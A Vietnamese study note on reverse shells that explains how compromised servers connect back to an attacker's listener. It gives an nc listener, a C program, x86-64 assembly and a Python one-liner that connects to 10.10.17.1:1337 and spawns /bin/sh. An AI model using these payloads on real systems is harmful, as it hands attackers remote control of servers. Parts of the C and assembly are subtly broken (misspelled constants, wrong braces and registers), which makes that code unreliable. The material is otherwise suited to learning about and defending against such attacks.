## Reverse shell
___
### **Shell là gì?**

Shell là một phần mềm cho phép người dùng tương tác với các dịch vụ, tài nguyên của hệ điều hành thông qua giao diện CLI hoặc là terminal. Shell được gọi là vỏ bọc cho hệ điều hành.

### **Reverse shell:**

Reverse shell là khi thay vì người dùng chủ động mở phiên kết nối đến một server đang nghe (giống việc sử dụng ssh, telnet,...) thì ở đây quy trình được đảo ngược lại. Vai trò của người dùng bây giờ là lắng nghe các kết nối, còn server sẽ có vai trò là kết nối đến máy chủ của người dùng.

Reverse shell từ server về máy chủ người dùng sẽ cấp shell trên chính terminal của máy chủ người dùng thay vì là sử dụng remote shell trên máy của server. Mọi tương tác trên shell này sẽ thực thi trên shell của server và tác động lên tài nguyên của server y hệt. 

Thông thường, việc users (hoặc là attacker) muốn kết nối đến server để sử dụng remote shell sẽ bị giới hạn và chặn bởi firewall, NAT (Network Address translation). Tuy nhiên, việc kết nối từ server ra bên ngoài, từ mạng nội bộ ra internet lại không bị chọn lọc và chặn bởi firewall hay NAT. Vì thế, attacker thường tận dụng tính năng này để khai thác hoặc kiểm soát server.

Việc khai thác lỗ hổng đó được khai thác trên chính server, khi mà server có những lỗ hổng trong codebase, web,... tạo điều kiện cho attacker đẩy malicious payload lên server, server thực thi nó và kết nối đến máy chủ attacker đang listening, và attacker sẽ thành công giành được shell trên máy mình

**Quy trình sẽ là:**
```python
# Attacker mở phiên lắng nghe các kết nối mạng
Attacker Machine -------- listening trên port xxxx ...

# Attacker khai thác lổ hổng và gửi mã độc vào máy server
Attacker Machine -------- exploit/insert payload -------> <vulnerbility> Server Machine
<x.x.x.x:xxxx>

# Server dính mã độc và thực thi kết nối về máy chủ Attacker
Attacker Machine <------- connect -------- Server Machine
<x.x.x.x:xxxx>

# Attacker nhận được shell cấp từ server
Attacker Machine -------- shell CLI -------> Server Machine
```
**Ảnh:**

<img width="438" height="178" alt="image" src="https://github.com/user-attachments/assets/a582c7ab-504a-4e78-8c19-ef2c0a0f2dae" />

___
### Ví dụ:
**Attacker machine**

Trước hết, lắng nghe trên máy mình: (attacker machine)
```c
nc -lvp 4444
```

**Server machine**

Ta biểu diễn chương trình kết nối từ server và gửi shell về máy chủ người dùng qua mã giả tựa C:
```c
#
sock = socket();
#
connect(sock, 127.0.0.1:4444);
#
dup2(sock, 0);  // stdin  -> socket
dup2(sock, 1);  // stdout -> socket
dup2(sock, 2);  // stderr -> socket
#
execve("/bin/sh", NULL, NULL);
```
* tạo socket - mở pipe kết nối
* kết nối từ server đến máy chủ user với socket được tạo
* đưa các quy chuẩn input/output về cho socket; để khi nhận được shell, nó gửi về user machine thay vì chạy trên localhost (server machine)
* thực hiện `/bin/sh` lấy shell

Code C:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(void) {
	int sockfd
	struct sockaddr_in user_addr;

	char *const argv[] = {"/bin/sh", NULL};
	char *const envp[] = {NULL};

	// create socket
	sockfd = socket(AF_NET, SOCK_STEAM, 0);

	// build user's address
	user_addr.sin_family = AF_INET; // ipv4
	user_addr.sin_port = htons{4444}; // port 4444
	user_addr.sin_addr.s_addr = inet_addr("x.x.x.x"); // user's machine

	// connect to user's address with created sockfd
	connect(sockfd, (struct sockaddr *)&user_addr, sizeof(user_addr));

	// redirect 3 data streams to the created socket, so shell spawn on user's machine and not handled locally
	dup2(sockfd, 0); //stdin
	dup2(sockfd, 1); //stdout
	dup2(sockfd, 2); //stderr

	// execute shell, spawn shell on user's machine 
	execve("/bin/sh", NULL, NULL); 

	close(sockfd);

	return 0;
}
```

Vì reverse shell thường là 1 payload (có thể file, text,..) để đẩy vào bất kỳ lỗ hổng trên server, nên kích cỡ payload nên phải nhỏ.

Code asm:

* syscall `socket`, `connect`:

<img width="998" height="63" alt="image" src="https://github.com/user-attachments/assets/8f061027-8fb7-431e-8ad6-08a8bd83b070" />

* syscall `dup2`:

<img width="998" height="64" alt="image" src="https://github.com/user-attachments/assets/96eecb0b-90dc-4d5f-86a8-cce27020af19" />

* syscall `execve`:

<img width="998" height="58" alt="image" src="https://github.com/user-attachments/assets/06a1a40a-95cb-435b-9f13-1f4f831ce46c" />

```asm
section .text
global _start

_start:

	; socketfd = socket()
	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall

	mov rbx, rax // socketfd

	; struct sockaddr_in user_addr
	mov rdx, host_ip
	push rdx
	mov dx, host_port
	push dx
	mov dx, 2 ; AF_INET
	push dx

	; connect()
	mov rax, 42
	mov rdi, rbx
	mov rsi, rsp
	mov rdx, 16 // sizeof(user_addr)
	syscall

	; 3 dup2() data steams to socket
	mov rax, 33
	mov rdi, 0 // stdin
	mov rsi, rbp
	syscall

	mov rax, 33
	mov rdi, 1 // stdout
	mov rsi, rbp
	syscall

	mov rax, 33
	mov rdi, 2 // stderr
	mov rsi, rbp
	syscall

	; spawn shell on host machine
	mov rax, 59
	mov rdi, "/bin/sh"
	mov rsi, 0 // null
	mov rdx, 0 // null
	syscall
```

Ngoài ra, có thể biểu diễn qua python dưới 1 dòng payload duy nhất. Sử dụng khi lỗ hổng có input text giới hạn số ký tự:
```python
# Cấu trúc giống code C trên
import socket

import subprocess

import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("0.0.0.0", 7777))

os.dup2(s.fileno(), 0)

os.dup2(s.fileno(), 1)

os.dup2(s.fileno(), 2)

p = subprocess.call(["/bin/sh", "-i"])
```
thành:
```python
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.17.1",1337));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```
___
Tài liệu:

https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/

https://www.reddit.com/r/explainlikeimfive/comments/mujbk4/eli5_reverse_shelling_and_shells_in_general/?tl=vi

https://www.imperva.com/learn/application-security/reverse-shell/

https://viblo.asia/p/hieu-ro-ve-reverse-shells-LzD5ddE45jY

https://www.invicti.com/learn/reverse-shell
